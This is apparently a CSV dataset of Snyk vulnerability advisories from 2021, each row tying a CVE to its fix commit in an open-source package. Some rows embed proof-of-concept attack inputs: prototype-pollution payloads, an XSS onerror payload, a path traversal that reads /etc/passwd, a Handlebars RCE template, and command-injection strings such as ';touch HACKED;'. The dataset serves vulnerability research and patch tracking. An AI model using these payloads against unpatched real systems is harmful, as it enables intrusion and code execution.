CVE-2021-4245,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-RFC6902-1053318,26/02/2021,04/02/2021,https://github.com/chbrown/rfc6902/commit/c006ce9faa43d31edb34924f1df7b79c137096cf,Prototype Pollution,https://api.github.com/repos/chbrown/rfc6902/commits/c006ce9faa43d31edb34924f1df7b79c137096cf,arjunshibu,arjunshibu1999@gmail.com,rfc6902,c006ce9faa43d31edb34924f1df7b79c137096cf,"Fix prototype pollution vulnerability

Closes #76",TypeScript,6.5,medium,"rfc6902 is a Complete implementation of RFC6902 (patch and diff)
Affected versions of this package are vulnerable to Prototype Pollution. It may allow attackers to inject or modify the methods and properties of the global object constructor.
PoC
// poc.js
var rfc6902 = require(""rfc6902"")
var obj = {}
console.log(""Before : "" + {}.polluted);
rfc6902.applyPatch(obj, [{ op: 'add', path: ""/__proto__/polluted"", value: ""Yes! Its Polluted""}]);
console.log(""After : "" + {}.polluted);",2021
CVE-2021-4278,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-TREEKIT-1077068,19/02/2021,19/02/2021,https://github.com/cronvel/tree-kit/commit/a63f559c50d70e8cb2eaae670dec25d1dbc4afcd,Prototype Pollution,https://api.github.com/repos/cronvel/tree-kit/commits/a63f559c50d70e8cb2eaae670dec25d1dbc4afcd,Cédric Ronvel,cedric.ronvel@gmail.com,tree-kit,a63f559c50d70e8cb2eaae670dec25d1dbc4afcd,"BREAKING CHANGE -- .path()/.dotPath(): drop the function's subtree support, fix prototype pollution",Unknown,7.5,high,"tree-kit is a Tree utilities which provides a full-featured extend and object-cloning facility, and various tools to deal with nested object structures.
Affected versions of this package are vulnerable to Prototype Pollution via dotPath.set.
PoC:
const { dotPath } = require('tree-kit')

console.log(""Before: "", {}.polluted)
dotPath.set({}, 'proto.polluted', true)
console.log(""After: "", {}.polluted)",2021
CVE-2021-23336,CWE-444,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-DJANGO-1076802,19/02/2021,19/02/2021,https://github.com/django/django/commit/be8237c7cce24b06aabde0b97afce98ddabbe3b6,Web Cache Poisoning,https://api.github.com/repos/django/django/commits/be8237c7cce24b06aabde0b97afce98ddabbe3b6,Nick Pope,nick@nickpope.me.uk,django,be8237c7cce24b06aabde0b97afce98ddabbe3b6,[3.2.x] Fixed CVE-2021-23336 -- Fixed web cache poisoning via django.utils.http.parse_qsl().,Python,5.9,medium,"Django is a high-level Python Web framework that encourages rapid development and clean, pragmatic design.
Affected versions of this package are vulnerable to Web Cache Poisoning. Django contains a copy of urllib.parse.parse_qsl() which was added to backport some security fixes. A further security fix has been issued recently such that parse_qsl() no longer allows using ; as a query parameter separator by default.",2021
CVE-2020-28499,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-MERGE-1042987,23/02/2021,22/11/2020,https://github.com/yeikos/js.merge/commit/7b0ddc2701d813f2ba289b32d6a4b9d4cc235fb4,Prototype Pollution,https://api.github.com/repos/yeikos/js.merge/commits/7b0ddc2701d813f2ba289b32d6a4b9d4cc235fb4,yeikos,yeikos@gmail.com,js.merge,7b0ddc2701d813f2ba289b32d6a4b9d4cc235fb4,fix: prototype pollution,JavaScript,7.3,high,"merge is a library that allows you to merge multiple objects into one, optionally creating a new cloned object. Similar to the jQuery.extend but more flexible. Works in Node.js and the browser.
Affected versions of this package are vulnerable to Prototype Pollution via _recursiveMerge .",2021
CVE-2021-23342,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-JS-DOCSIFY-1066017,18/02/2021,19/02/2021,https://github.com/docsifyjs/docsify/commit/ff2a66f12752471277fe81a64ad6c4b2c08111fe,Cross-site Scripting (XSS),https://api.github.com/repos/docsifyjs/docsify/commits/ff2a66f12752471277fe81a64ad6c4b2c08111fe,John Hildenbiddle,jhildenbiddle@users.noreply.github.com,docsify,ff2a66f12752471277fe81a64ad6c4b2c08111fe,"fix: isExternal check with malformed URL + tests (#1510)

Fix #1477. Fix #1126. Follow-up to #1489.",JavaScript,8.6,high,"docsify is a magical documentation site generator.
Affected versions of this package are vulnerable to Cross-site Scripting (XSS). It is possible to bypass the remediation done by CVE-2020-7680 and execute malicious JavaScript through the following methods

When parsing HTML from remote URLs, the HTML code on the main page is sanitized, but this sanitization is not taking place in the sidebar. 

The isURL external check can be bypassed by inserting more “////” characters


PoC
* Have a running PHP webserver with the following code 
<?php
header(""Access-Control-Allow-Origin: *""); 

?>
<img src=x onerror=alert(document.domain)> 

Access your docisfy instance as follows: http://yourdocsifyserver/#//yourserver.local:8090/test.php/
Note: The fix for this issue is within release 4.12.1, not 4.12.0",2021
CVE-2021-23340,CWE-23,Snyk,https://security.snyk.io/vuln/SNYK-PHP-PIMCOREPIMCORE-1070132,18/02/2021,18/02/2021,https://github.com/pimcore/pimcore/commit/1786bdd4962ee51544fad537352c2b4223309442,Local File Inclusion,https://api.github.com/repos/pimcore/pimcore/commits/1786bdd4962ee51544fad537352c2b4223309442,Bernhard Rusch,bernhard.rusch@elements.at,pimcore,1786bdd4962ee51544fad537352c2b4223309442,Fixed LFI in custom report csv download,PHP,7.1,high,"pimcore/pimcore is a content & product management framework (CMS/PIM/E-Commerce).
Affected versions of this package are vulnerable to Local File Inclusion. A Local FIle Inclusion vulnerability exists in the downloadCsvAction function of the CustomReportController class (bundles/AdminBundle/Controller/Reports/CustomReportController.php). An authenticated user can reach this function with a GET request at the following endpoint: /admin/reports/custom-report/download-csv?exportFile=&#91;filename]. Since exportFile variable is not sanitized, an attacker can exploit a local file inclusion vulnerability.
PoC
* Login in Pimcore
* Send a GET request to the endpoint: /admin/reports/custom-report/download-csv?exportFile=../../../../../../../../../../../../../../../etc/passwd to retrieve del passwd file of the Linux system. (Inside the request insert the header X-pimcore-csrf-token).",2021
CVE-2021-23341,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-JS-PRISMJS-1076581,18/02/2021,18/02/2021,https://github.com/PrismJS/prism/commit/c2f6a64426f44497a675cb32dccb079b3eff1609,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/PrismJS/prism/commits/c2f6a64426f44497a675cb32dccb079b3eff1609,Michael Schmidt,mitchi5000.ms@googlemail.com,prism,c2f6a64426f44497a675cb32dccb079b3eff1609,Fixed multiple cases of vulnerable regexes (#2584),JavaScript,7.5,high,"prismjs is a lightweight, robust, elegant syntax highlighting library.
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the prism-asciidoc, prism-rest, prism-tap and prism-eiffel components.",2021
CVE-2021-23339,CWE-444,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-COMTYPESAFEAKKA-2315411,17/02/2021,15/02/2021,https://github.com/akka/akka-http/commit/e3a4935151c91cee28e65e6b894dd50839ef9d34,HTTP Request Smuggling,https://api.github.com/repos/akka/akka-http/commits/e3a4935151c91cee28e65e6b894dd50839ef9d34,Johan Andrén,johan@markatta.com,akka-http,e3a4935151c91cee28e65e6b894dd50839ef9d34,core: disallow parsing of Transfer-Encoding other than chunked (#3754),Unknown,5.0,medium,"com.typesafe.akka:akka-http-core_2.12 is a Scala implementation of the akka-http-core library which provides a  streaming-first HTTP server and client.
Affected versions of this package are vulnerable to HTTP Request Smuggling. It allows multiple Transfer-Encoding headers.",2021
CVE-2021-23339,CWE-444,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-COMTYPESAFEAKKA-2315412,17/02/2021,15/02/2021,https://github.com/akka/akka-http/commit/e3a4935151c91cee28e65e6b894dd50839ef9d34,HTTP Request Smuggling,https://api.github.com/repos/akka/akka-http/commits/e3a4935151c91cee28e65e6b894dd50839ef9d34,Johan Andrén,johan@markatta.com,akka-http,e3a4935151c91cee28e65e6b894dd50839ef9d34,core: disallow parsing of Transfer-Encoding other than chunked (#3754),Unknown,5.0,medium,"com.typesafe.akka:akka-http-core_2.13 is a modern, fast, asynchronous, streaming-first HTTP server and client.
Affected versions of this package are vulnerable to HTTP Request Smuggling. It allows multiple Transfer-Encoding headers.",2021
CVE-2021-23369,CWE-94,Snyk,https://security.snyk.io/vuln/SNYK-JS-HANDLEBARS-1056767,15/02/2021,08/01/2021,https://github.com/handlebars-lang/handlebars.js/commit/b6d3de7123eebba603e321f04afdbae608e8fea8,Remote Code Execution (RCE),https://api.github.com/repos/handlebars-lang/handlebars.js/commits/b6d3de7123eebba603e321f04afdbae608e8fea8,Nils Knappmeier,npm@knappi.org,handlebars.js,b6d3de7123eebba603e321f04afdbae608e8fea8,fix: check prototype property access in strict-mode (#1736),JavaScript,7.0,high,"handlebars is an extension to the Mustache templating language.
Affected versions of this package are vulnerable to Remote Code Execution (RCE) when selecting certain compiling options to compile templates coming from an untrusted source.
POC
<script src=""https://cdn.jsdelivr.net/npm/handlebars@latest/dist/handlebars.js""></script> 
<script> 
// compile the template 
var s = ` 
{{#with (__lookupGetter__ ""__proto__"")}} 
{{#with (./constructor.getOwnPropertyDescriptor . ""valueOf"")}} 
{{#with ../constructor.prototype}} 
{{../../constructor.defineProperty . ""hasOwnProperty"" ..}} 
{{/with}} 
{{/with}} 
{{/with}} 
{{#with ""constructor""}} 
{{#with split}} 
{{pop (push ""alert('Vulnerable Handlebars JS when compiling in strict mode');"")}} 
{{#with .}} 
{{#with (concat (lookup join (slice 0 1)))}} 
{{#each (slice 2 3)}} 
{{#with (apply 0 ../..)}} 
{{.}} 
{{/with}} 
{{/each}} 
{{/with}} 
{{/with}} 
{{/with}} 
{{/with}} 
`;
var template = Handlebars.compile(s, { 
strict: true 
}); 
// execute the compiled template and print the output to the console console.log(template({})); 
</script>",2021
CVE-2021-23338,CWE-502,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-QLIB-1054635,15/02/2021,28/12/2020,https://github.com/microsoft/qlib/commit/50d5fcf61e816d78d226142d352c554a31873eea,Deserialization of Untrusted Data,https://api.github.com/repos/microsoft/qlib/commits/50d5fcf61e816d78d226142d352c554a31873eea,Young,afe.young@gmail.com,qlib,50d5fcf61e816d78d226142d352c554a31873eea,yml afe load,Python,,Proof of concept,"qlib is an A Q Library for Data Scientist
Affected versions of this package are vulnerable to Deserialization of Untrusted Data. The workflow function in cli part of qlib was using an unsafe YAML load function.",2021
CVE-2021-23339,CWE-444,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-COMTYPESAFEAKKA-1075043,17/02/2021,15/02/2021,https://github.com/akka/akka-http/commit/e3a4935151c91cee28e65e6b894dd50839ef9d34,HTTP Request Smuggling,https://api.github.com/repos/akka/akka-http/commits/e3a4935151c91cee28e65e6b894dd50839ef9d34,Johan Andrén,johan@markatta.com,akka-http,e3a4935151c91cee28e65e6b894dd50839ef9d34,core: disallow parsing of Transfer-Encoding other than chunked (#3754),Unknown,5.0,medium,"com.typesafe.akka:akka-http-core is a full server- and client-side HTTP stack on top of akka-actor and akka-stream.
Affected versions of this package are vulnerable to HTTP Request Smuggling. It allows multiple Transfer-Encoding headers.",2021
CVE-2021-23338,CWE-502,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-PYQLIB-1085990,15/02/2021,28/12/2020,https://github.com/microsoft/qlib/commit/50d5fcf61e816d78d226142d352c554a31873eea,Deserialization of Untrusted Data,https://api.github.com/repos/microsoft/qlib/commits/50d5fcf61e816d78d226142d352c554a31873eea,Young,afe.young@gmail.com,qlib,50d5fcf61e816d78d226142d352c554a31873eea,yml afe load,Python,6.6,medium,"pyqlib is an AI-oriented quantitative investment platform.
Affected versions of this package are vulnerable to Deserialization of Untrusted Data. The workflow function in cli part of qlib was using an unsafe YAML load function.",2021
CVE-2021-23341,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-PHP-PRISMJSPRISM-1585199,18/02/2021,18/02/2021,https://github.com/PrismJS/prism/commit/c2f6a64426f44497a675cb32dccb079b3eff1609,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/PrismJS/prism/commits/c2f6a64426f44497a675cb32dccb079b3eff1609,Michael Schmidt,mitchi5000.ms@googlemail.com,prism,c2f6a64426f44497a675cb32dccb079b3eff1609,Fixed multiple cases of vulnerable regexes (#2584),JavaScript,7.5,high,"prismjs/prism is a Lightweight, robust, elegant syntax highlighting. A spin-off project from Dabblet.
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the prism-asciidoc, prism-rest, prism-tap and prism-eiffel components.",2021
CVE-2021-23339,CWE-444,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-COMTYPESAFEAKKA-2315410,17/02/2021,15/02/2021,https://github.com/akka/akka-http/commit/e3a4935151c91cee28e65e6b894dd50839ef9d34,HTTP Request Smuggling,https://api.github.com/repos/akka/akka-http/commits/e3a4935151c91cee28e65e6b894dd50839ef9d34,Johan Andrén,johan@markatta.com,akka-http,e3a4935151c91cee28e65e6b894dd50839ef9d34,core: disallow parsing of Transfer-Encoding other than chunked (#3754),Unknown,5.0,medium,"com.typesafe.akka:akka-http-core_2.11 is a Scala implementation of the akka-http-core library which provides a  streaming-first HTTP server and client.
Affected versions of this package are vulnerable to HTTP Request Smuggling. It allows multiple Transfer-Encoding headers.",2021
CVE-2021-23337,CWE-78,Snyk,https://security.snyk.io/vuln/SNYK-RUBY-LODASHRAILS-1088056,15/02/2021,17/11/2020,https://github.com/lodash/lodash/commit/3469357cff396a26c363f8c1b5a91dde28ba4b1c,Command Injection,https://api.github.com/repos/lodash/lodash/commits/3469357cff396a26c363f8c1b5a91dde28ba4b1c,Christophe Coevoet,stof@notk.org,lodash,3469357cff396a26c363f8c1b5a91dde28ba4b1c,"Prevent command injection through `_.template`'s `variable` option

Closes #5085.",JavaScript,7.2,high,"lodash-rails is a lodash for the Rails asset pipeline.
Affected versions of this package are vulnerable to Command Injection via template.
PoC
var _ = require('lodash');

_.template('', { variable: '){console.log(process.env)}; with(obj' })()",2021
CVE-2021-23337,CWE-78,Snyk,https://security.snyk.io/vuln/SNYK-JS-LODASHES-2434284,15/02/2021,17/11/2020,https://github.com/lodash/lodash/commit/3469357cff396a26c363f8c1b5a91dde28ba4b1c,Command Injection,https://api.github.com/repos/lodash/lodash/commits/3469357cff396a26c363f8c1b5a91dde28ba4b1c,Christophe Coevoet,stof@notk.org,lodash,3469357cff396a26c363f8c1b5a91dde28ba4b1c,"Prevent command injection through `_.template`'s `variable` option

Closes #5085.",JavaScript,7.2,high,"Affected versions of this package are vulnerable to Command Injection via template.
PoC
var _ = require('lodash');

_.template('', { variable: '){console.log(process.env)}; with(obj' })()",2021
CVE-2021-23337,CWE-78,Snyk,https://security.snyk.io/vuln/SNYK-JS-LODASH-1040724,15/02/2021,17/11/2020,https://github.com/lodash/lodash/commit/3469357cff396a26c363f8c1b5a91dde28ba4b1c,Command Injection,https://api.github.com/repos/lodash/lodash/commits/3469357cff396a26c363f8c1b5a91dde28ba4b1c,Christophe Coevoet,stof@notk.org,lodash,3469357cff396a26c363f8c1b5a91dde28ba4b1c,"Prevent command injection through `_.template`'s `variable` option

Closes #5085.",JavaScript,7.2,high,"lodash is a modern JavaScript utility library delivering modularity, performance, & extras.
Affected versions of this package are vulnerable to Command Injection via template.
PoC
var _ = require('lodash');

_.template('', { variable: '){console.log(process.env)}; with(obj' })()",2021
CVE-2021-23337,CWE-78,Snyk,https://security.snyk.io/vuln/SNYK-JS-LODASHTEMPLATE-1088054,15/02/2021,17/11/2020,https://github.com/lodash/lodash/commit/3469357cff396a26c363f8c1b5a91dde28ba4b1c,Command Injection,https://api.github.com/repos/lodash/lodash/commits/3469357cff396a26c363f8c1b5a91dde28ba4b1c,Christophe Coevoet,stof@notk.org,lodash,3469357cff396a26c363f8c1b5a91dde28ba4b1c,"Prevent command injection through `_.template`'s `variable` option

Closes #5085.",JavaScript,7.2,high,"lodash.template is a The Lodash method _.template exported as a Node.js module.
Affected versions of this package are vulnerable to Command Injection via template.
PoC
var _ = require('lodash');

_.template('', { variable: '){console.log(process.env)}; with(obj' })()",2021
CVE-2020-28500,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-JS-LODASHES-2434289,15/02/2021,16/10/2020,https://github.com/lodash/lodash/commit/c4847ebe7d14540bb28a8b932a9ce1b9ecbfee1a,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/lodash/lodash/commits/c4847ebe7d14540bb28a8b932a9ce1b9ecbfee1a,Michał Lipiński,mylith@gmail.com,lodash,c4847ebe7d14540bb28a8b932a9ce1b9ecbfee1a,"Improve performance of `toNumber`, `trim` and `trimEnd` on large input strings

This prevents potential ReDoS attacks using `_.toNumber` and `_.trim*`
as potential attack vectors.

Closes #5065.",JavaScript,5.3,medium,"Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the toNumber, trim and trimEnd functions.
POC
var lo = require('lodash');

function build_blank (n) {
var ret = ""1""
for (var i = 0; i < n; i++) {
ret += "" ""
}
return ret + ""1"";
}
var s = build_blank(50000)
var time0 = Date.now();
lo.trim(s)
var time_cost0 = Date.now() - time0;
console.log(""time_cost0: "" + time_cost0)
var time1 = Date.now();
lo.toNumber(s)
var time_cost1 = Date.now() - time1;
console.log(""time_cost1: "" + time_cost1)
var time2 = Date.now();
lo.trimEnd(s)
var time_cost2 = Date.now() - time2;
console.log(""time_cost2: "" + time_cost2)",2021
CVE-2020-28500,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-JS-LODASH-1018905,15/02/2021,16/10/2020,https://github.com/lodash/lodash/commit/c4847ebe7d14540bb28a8b932a9ce1b9ecbfee1a,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/lodash/lodash/commits/c4847ebe7d14540bb28a8b932a9ce1b9ecbfee1a,Michał Lipiński,mylith@gmail.com,lodash,c4847ebe7d14540bb28a8b932a9ce1b9ecbfee1a,"Improve performance of `toNumber`, `trim` and `trimEnd` on large input strings

This prevents potential ReDoS attacks using `_.toNumber` and `_.trim*`
as potential attack vectors.

Closes #5065.",JavaScript,5.3,medium,"lodash is a modern JavaScript utility library delivering modularity, performance, & extras.
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the toNumber, trim and trimEnd functions.
POC
var lo = require('lodash');

function build_blank (n) {
var ret = ""1""
for (var i = 0; i < n; i++) {
ret += "" ""
}
return ret + ""1"";
}
var s = build_blank(50000)
var time0 = Date.now();
lo.trim(s)
var time_cost0 = Date.now() - time0;
console.log(""time_cost0: "" + time_cost0)
var time1 = Date.now();
lo.toNumber(s)
var time_cost1 = Date.now() - time1;
console.log(""time_cost1: "" + time_cost1)
var time2 = Date.now();
lo.trimEnd(s)
var time_cost2 = Date.now() - time2;
console.log(""time_cost2: "" + time_cost2)",2021
CVE-2017-12645,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-COMLIFERAYPORTAL-1072104,12/02/2021,08/08/2017,https://github.com/liferay/liferay-portal/commit/f30571c3502551945ba7497e8d80e8b2295f1026,Cross-site Scripting (XSS),https://api.github.com/repos/liferay/liferay-portal/commits/f30571c3502551945ba7497e8d80e8b2295f1026,Matthew Tambara,matthew.tambara@liferay.com,liferay-portal,f30571c3502551945ba7497e8d80e8b2295f1026,LPS-72307 Move portletId validation to portlet deploy,Java,6.1,medium,"com.liferay.portal:com.liferay.portal.impl is a package part of Liferay.
Affected versions of this package are vulnerable to Cross-site Scripting (XSS) via an invalid portletId.",2021
CVE-2020-7786,CWE-78,Snyk,https://security.snyk.io/vuln/SNYK-JS-MACFROMIP-1048336,09/02/2021,04/12/2020,https://github.com/bcamarneiro/macfromip/commit/1bbed8cd6f8299ad2e9d028e0ed0771340ab8391,Command Injection,https://api.github.com/repos/bcamarneiro/macfromip/commits/1bbed8cd6f8299ad2e9d028e0ed0771340ab8391,Bruno Camarneiro,camarneirobruno@gmail.com,macfromip,1bbed8cd6f8299ad2e9d028e0ed0771340ab8391,use babel and es6,Unknown,9.8,critical,"macfromip is a module that gets a MAC address from a LAN IP address
Affected versions of this package are vulnerable to Command Injection. The injection points are located in lines 66 and 96 in macfromip.js.
PoC
var a = require(""macfromip"");
a.getMacInLinux(""& touch JHU"", function(){});
a.getMacInWin32(""& touch JHU2 &"", function(){});",2021
CVE-2021-23327,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-JS-APEXCHARTS-1062708,09/02/2021,20/01/2021,https://github.com/apexcharts/apexcharts.js/commit/68f3f34d125719b4767614fe0a595cc65bde1d19,Cross-site Scripting (XSS),https://api.github.com/repos/apexcharts/apexcharts.js/commits/68f3f34d125719b4767614fe0a595cc65bde1d19,Juned Chhipa,juned.chhipa@gmail.com,apexcharts.js,68f3f34d125719b4767614fe0a595cc65bde1d19,"Merge pull request #2158 from 418sec/1-npm-apexcharts

Security Fix for Cross-Site Scripting (XSS) - huntr.dev",JavaScript,6.3,medium,"apexcharts is a modern JavaScript charting library to build interactive charts and visualizations with simple API.
Affected versions of this package are vulnerable to Cross-site Scripting (XSS) via lack of sanitization of graph legend fields.",2021
,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-HIGHCHARTS-1018906,05/02/2021,04/02/2021,https://github.com/highcharts/highcharts/commit/fead359b37079482994ee86c2e2e60fbb02ffcb8,Prototype Pollution,https://api.github.com/repos/highcharts/highcharts/commits/fead359b37079482994ee86c2e2e60fbb02ffcb8,Torstein Hønsi,torstein@highsoft.com,highcharts,fead359b37079482994ee86c2e2e60fbb02ffcb8,"Fixed #14883, possible prototype pollution through chart configuration",JavaScript,6.3,medium,"highcharts is a JavaScript charting library based on SVG, with fallbacks to VML and canvas for old browsers.
Affected versions of this package are vulnerable to Prototype Pollution via the merge function. The function recursively merges the target object with the source object (or in case of just one object the function is equivalent to a deep copy). However, it does not properly check the keys being set, leading to prototype pollution.
The impact depends on the application. In some cases, it is possible to achieve Denial of service (DoS), Remote Code Execution (or XSS) or Property Injection.",2021
CVE-2021-26707,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-MERGEDEEP-1070277,05/02/2021,05/02/2021,https://github.com/jonschlinkert/merge-deep/commit/e370968581413a2e5ffdbbf7c2f5094e0e0b3861,Prototype Pollution,https://api.github.com/repos/jonschlinkert/merge-deep/commits/e370968581413a2e5ffdbbf7c2f5094e0e0b3861,Brian Woodward,brian.woodward@gmail.com,merge-deep,e370968581413a2e5ffdbbf7c2f5094e0e0b3861,"Merge pull request #17 from jonschlinkert/key-properties

Property keys",Config files,7.3,high,"merge-deep is a recursively merges values in a javascript object.
Affected versions of this package are vulnerable to Prototype Pollution. Merge-deep actively attempts to prevent prototype pollution by blocking object property merges into __proto__, however it still allows for prototype pollution of Object.prototype via a constructor payload.
PoC
var mergeDeep = require(""merge-deep"");
var payload = '{""constructor"": {""prototype"": {""isAdmin"": true}}}';
mergeDeep({}, JSON.parse(payload));",2021
CVE-2020-28498,CWE-310,Snyk,https://security.snyk.io/vuln/SNYK-JS-ELLIPTIC-1064899,03/02/2021,26/01/2021,https://github.com/indutny/elliptic/commit/441b7428b0e8f6636c42118ad2aaa186d3c34c3f,Cryptographic Issues,https://api.github.com/repos/indutny/elliptic/commits/441b7428b0e8f6636c42118ad2aaa186d3c34c3f,Kyle Den Hartog,kdenhartog@users.noreply.github.com,elliptic,441b7428b0e8f6636c42118ad2aaa186d3c34c3f,"ec: validate that a point before deriving keys

This update checks to make sure that the public key passed in to
ECDH is a point that actually exists on the curve. This is
important to prevent a twist attack that can be used to reveal
the private key of a party in an ECDH operation over a number of
occurances.

For more details on the attack see this blog post:
https://github.com/christianlundkvist/blog/blob/master/2020_05_26_secp256k1_twist_attacks/secp256k1_twist_attacks.md

CVE: CVE-2020-28498",JavaScript,6.8,medium,"elliptic is a Fast elliptic-curve cryptography in a plain javascript implementation.
Affected versions of this package are vulnerable to Cryptographic Issues via the secp256k1 implementation in elliptic/ec/key.js. There is no check to confirm that the public key point passed into the derive function actually exists on the secp256k1 curve. This results in the potential for the private key used in this implementation to be revealed after a number of ECDH operations are performed.",2021
,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-JS-NGXMARKDOWNEDITOR-1070023,03/02/2021,03/02/2021,https://github.com/lon-yang/ngx-markdown-editor/commit/151151420d562d4203208f0b64a4ffa445188403,Cross-site Scripting (XSS),https://api.github.com/repos/lon-yang/ngx-markdown-editor/commits/151151420d562d4203208f0b64a4ffa445188403,lon-yang,dove2580@live.com,ngx-markdown-editor,151151420d562d4203208f0b64a4ffa445188403,"Release 3.3.0, #78, using domsanitizer as default markjs sanitize func",TypeScript,5.4,medium,"ngx-markdown-editor is an Angular markdown editor based on ace editor.
Affected versions of this package are vulnerable to Cross-site Scripting (XSS) via the markdown editor.",2021
CVE-2021-23330,CWE-94,Snyk,https://security.snyk.io/vuln/SNYK-JS-LAUNCHPAD-1044065,01/02/2021,24/11/2020,https://github.com/bitovi/launchpad/commit/e2f506b5089b1b29d22c80a77ff636b3b1f6e57c,Command Injection,https://api.github.com/repos/bitovi/launchpad/commits/e2f506b5089b1b29d22c80a77ff636b3b1f6e57c,Brad Momberger,brad@bitovi.com,launchpad,e2f506b5089b1b29d22c80a77ff636b3b1f6e57c,"Merge pull request #124 from 418sec/master

Security Fix for Remote Code Execution - huntr.dev",JavaScript,9.8,critical,"launchpad is a You can launch browsers! From NodeJS! Local ones! Remote ones! Browserstack ones!
Affected versions of this package are vulnerable to Command Injection via stop.",2021
CVE-2020-28495,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-TOTALJS-1046671,29/01/2021,29/01/2021,https://github.com/totaljs/framework/commit/b3f901561d66ab799a4a99279893b94cad7ae4ff,Prototype Pollution,https://api.github.com/repos/totaljs/framework/commits/b3f901561d66ab799a4a99279893b94cad7ae4ff,Peter Sirka,petersirka@gmail.com,framework,b3f901561d66ab799a4a99279893b94cad7ae4ff,Fixed `U.set()` by adding check for `Prototype pollution`.,JavaScript,7.3,high,"total.js is a framework for Node.js platfrom written in pure JavaScript similar to PHP's Laravel or Python's Django or ASP.NET MVC. It can be used as web, desktop, service or IoT application.
Affected versions of this package are vulnerable to Prototype Pollution. The set function can be used to set a value into the object according to the path. However the keys of the path being set are not properly sanitized, leading to a prototype pollution vulnerability. The impact depends on the application. In some cases it is possible to achieve Denial of service (DoS), Remote Code Execution or Property Injection. 
PoC
const total = require('total.js');
let obj = {};
console.log(""Before : "" + obj.polluted);
U.set({}, '__proto__.polluted', ""yes"");
console.log(""After : "" + obj.polluted);",2021
CVE-2020-28494,CWE-78,Snyk,https://security.snyk.io/vuln/SNYK-JS-TOTALJS-1046672,29/01/2021,29/01/2021,https://github.com/totaljs/framework/commit/6192491ab2631e7c1d317c221f18ea613e2c18a5,Command Injection,https://api.github.com/repos/totaljs/framework/commits/6192491ab2631e7c1d317c221f18ea613e2c18a5,Peter Sirka,petersirka@gmail.com,framework,6192491ab2631e7c1d317c221f18ea613e2c18a5,"Fixed ""Command Injection"" in `image.stream()` - thank to Sam Sanoop.",JavaScript,8.6,high,"total.js is a framework for Node.js platfrom written in pure JavaScript similar to PHP's Laravel or Python's Django or ASP.NET MVC. It can be used as web, desktop, service or IoT application.
Affected versions of this package are vulnerable to Command Injection. The issue occurs in the image.pipe  and image.stream functions. The type parameter is used to build the command that is then executed using child_process.spawn. The issue occurs because child_process.spawn is called with the option shell set to true and because the type parameter is not properly sanitized.
PoC
const total = require('total.js');
let image = Image.load("""");
let payload = "";touch HACKED;"";
image.stream(payload);
// image.pipe(null, payload);",2021
CVE-2020-28490,CWE-78,Snyk,https://security.snyk.io/vuln/SNYK-JS-ASYNCGIT-1064877,26/01/2021,26/01/2021,https://github.com/omrilotan/async-git/commit/d1950a5021f4e19d92f347614be0d85ce991510d,Command Injection,https://api.github.com/repos/omrilotan/async-git/commits/d1950a5021f4e19d92f347614be0d85ce991510d,omrilotan,516342+omrilotan@users.noreply.github.com,async-git,d1950a5021f4e19d92f347614be0d85ce991510d,Use spawn with git to avoid shell script vulnerabilities (#14),JavaScript,9.1,critical,"async-git is a 👾 Retrieve data from current git repository
Affected versions of this package are vulnerable to Command Injection via shell meta-characters (back-ticks). For example: git.reset('atouch HACKEDb')",2021
CVE-2020-28491,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-COMFASTERXMLJACKSONDATAFORMAT-1047329,26/01/2021,26/01/2021,https://github.com/FasterXML/jackson-dataformats-binary/commit/de072d314af8f5f269c8abec6930652af67bc8e6,Denial of Service (DoS),https://api.github.com/repos/FasterXML/jackson-dataformats-binary/commits/de072d314af8f5f269c8abec6930652af67bc8e6,Tatu Saloranta,tatu.saloranta@iki.fi,jackson-dataformats-binary,de072d314af8f5f269c8abec6930652af67bc8e6,Fix eager allocation aspect of #186,Java,7.5,high,Affected versions of this package are vulnerable to Denial of Service (DoS). Unchecked allocation of byte buffer can cause a java.lang.OutOfMemoryError exception.,2021
CVE-2020-28446,CWE-78,Snyk,https://security.snyk.io/vuln/SNYK-JS-NTESSERACT-1050982,26/01/2021,14/12/2020,https://github.com/taoyuan/ntesseract/commit/fcbc36f381798b4362179c0cdf9961b437c7b619,Command Injection,https://api.github.com/repos/taoyuan/ntesseract/commits/fcbc36f381798b4362179c0cdf9961b437c7b619,ty,towyuan@outlook.com,ntesseract,fcbc36f381798b4362179c0cdf9961b437c7b619,fix: vulnerable to command injection,JavaScript,9.8,critical,"ntesseract is a simple wrapper for the Tesseract OCR package for node.js
Affected versions of this package are vulnerable to Command Injection via lib/tesseract.js.",2021
